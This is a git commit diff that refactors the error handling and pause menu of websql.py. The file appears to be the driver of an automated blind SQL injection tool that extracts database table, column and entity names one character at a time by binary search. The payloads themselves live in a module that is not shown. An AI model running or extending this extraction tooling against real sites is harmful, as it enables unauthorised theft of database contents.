2bca07d1f7ffe5fae07da73c568bc61603fce9b3
user0o1 <swag.designer812@passfwd.com>
2025-03-06 10:12:31 +0000

    fixed error handlers

--- websql.py
+++ websql.py
@@ -17,7 +17,7 @@ async def extract_binary(session, data):
             return chars[mid]
         else:
             right = mid - 1
-    return 0
+    return None
 
 async def main():
     chars = sorted(string.ascii_lowercase + string.digits)
@@ -27,35 +27,35 @@ async def main():
     counter = 1
     letter_position = 1
     num, char = 0, 0
-    #data = {
-    #    "general_name": general_name,
-    #    "counter": counter,
-    #    "offset": cfg.usr_offset,
-    #    "letter_position": letter_position,
-    #    "operator": "=",
-    #    "nums": nums,
-    #    "chars": chars,
-    #    "num": num,
-    #    "char": char
-    #}
+    data = {
+        "general_name": general_name,
+        "counter": counter,
+        "offset": cfg.usr_offset,
+        "letter_position": letter_position,
+        "operator": "=",
+        "nums": nums,
+        "chars": chars,
+        "num": num,
+        "char": char
+    }
     
-    try:
-        async with aiohttp.ClientSession() as session:
-            while True:
-                data = {
-                        "general_name": general_name,
-                        "counter": counter,
-                        "offset": cfg.usr_offset,
-                        "letter_position": letter_position,
-                        "operator": "=",
-                        "nums": nums,
-                        "chars": chars,
-                        "num": num,
-                        "char": char
-                }
-                if cfg.usr_mode == 'table' or cfg.usr_mode == 'column' or cfg.usr_mode == 'entity':
-                    
-                    #### quick check for special chars
+    async with aiohttp.ClientSession() as session:
+        while True:
+            #data = {
+            #        "general_name": general_name,
+            #        "counter": counter,
+            #        "offset": cfg.usr_offset,
+            #        "letter_position": letter_position,
+            #        "operator": "=",
+            #        "nums": nums,
+            #        "chars": chars,
+            #        "num": num,
+            #        "char": char
+            #}
+            if cfg.usr_mode in ('table', 'column', 'entity'):
+
+                #### quick check for special chars
+                try:
                     tasks = [injection.inject_payload(session, {**data, "char": char}) for char in cfg.special_chars]
                     results = await asyncio.gather(*tasks)
 
@@ -67,56 +67,47 @@ async def main():
                     else:
                         attack = await extract_binary(session, data)
                         if attack:
-                            general_name += attack
-                            letter_position += 1
+                            data['general_name'] += attack
+                            data['letter_position'] += 1
                         else:
                             sys.stdout.write("\n")
-                            print(f"[+] done. data dumped: {general_name}")
-                            cfg.usr_offset += 1
-                            letter_position = 1
-                            general_name = ""
+                            print(f"\n[+] done. data dumped: {data['general_name']}")
+                            data['offset'] += 1
+                            data['letter_position'], data['general_name'] = 1, ""
 
-    
-    #except KeyboardInterrupt:
-        #print("[!] force exit stage 2")
-        #print("\n[!] Player paused the game...\r")
-        #usr_abort_question = input("\n[?] Your choice [(c)ontinue/(e)nd this phase/(q)uit]: _")
-        #if usr_abort_question == 'c':
-            #continue
-        #if usr_abort_question == 'q':
-        #    print("\n[x] Player left the game [x]")
-        
-    except Exception as e:
-        print("[!] stage 2 error: ", e)
-        sys.exit(1)
+                except(asyncio.CancelledError, KeyboardInterrupt):
+                    while True:
+                        print("\n\n\n[!] Pause menu...\r")
+                        usr_abort_question = await asyncio.to_thread(input, "[?] Your choice [(c)ontinue/(e)nd this phase/(q)uit]: _")
+                        if usr_abort_question == 'c':
+                            print("[+] Continuing...\n")
+                            break 
+                        elif usr_abort_question == 'e':
+                            print("\n[x] Ending current phase [x]")
+                            return 0
+                        elif usr_abort_question == 'q':
+                            print("\n[x] Player left the game [x]")
+                            return 0
+                except Exception as e:
+                    print("[!] stage 2 error: ", e)
+                    await asyncio.sleep(1)
+                    sys.exit(1)
 
-    return general_name, counter
-
+    #await asyncio.sleep(20)
+    #return general_name, counter
+    return None
 
 
 if __name__ == "__main__":
-    while True:
-        try:
-            asyncio.run(main())
-        except KeyboardInterrupt:
-            print("[!] force exit stage 2")
-            print("\n[!] Player paused the game...\r")
-            usr_abort_question = input("\n[?] Your choice [(c)ontinue/(e)nd this phase/(q)uit]: _")
-            if usr_abort_question == 'e':
-                sys.exit(1)
-            elif usr_abort_question == 'q':
-                print("\n[x] Player left the game [x]")
-                sys.exit(1)
-            elif usr_abort_question == 'c':
-                print("continue...")
-                continue
-            #print("[!] force exit")
-            #sys.exit(1)
-        except Exception as e:
-            print("[!] stage 1 error: ", e)
-            sys.exit(1)
-        finally:
-            sys.exit(1)
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("[!] force exit stage 1")
+        sys.exit(0)
+    except Exception as e:
+        print("[!] stage 1 error: ", e)
+        sys.exit(1)
+    finally:
+        sys.exit(0)
 else:
     sys.exit(1)
-        
